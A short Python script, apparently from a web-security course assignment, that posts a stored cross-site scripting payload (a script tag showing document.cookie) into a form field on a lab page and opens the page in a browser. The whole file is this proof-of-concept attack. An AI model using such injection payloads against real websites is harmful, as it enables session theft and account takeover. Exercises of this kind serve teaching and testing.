import requests
import webbrowser

def main():
    url = 'http://wsb.com/Assignment2/case04.php'
    payload = {'title':'Exploit', 'content':'<script>alert(document.cookie)</script>'}
    r = requests.post(url, data=payload)

    webbrowser.open(url, 2)

if __name__ == "__main__":
    main()
